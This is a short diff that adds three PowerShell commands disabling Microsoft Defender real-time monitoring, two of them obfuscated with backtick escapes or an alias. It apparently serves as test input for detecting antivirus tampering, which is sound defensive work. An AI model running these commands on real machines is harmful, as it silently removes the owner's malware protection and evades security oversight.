@@ -1,0 +1,3 @@
+powershell.exe -Command "S`e`t-MpPreference -DisableRealtimeMonitoring $true"
+powershell.exe -Command "Set-Alias -Name smp -Value Set-MpPreference; smp -DisableRealtimeMonitoring $true"
+powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring 1"
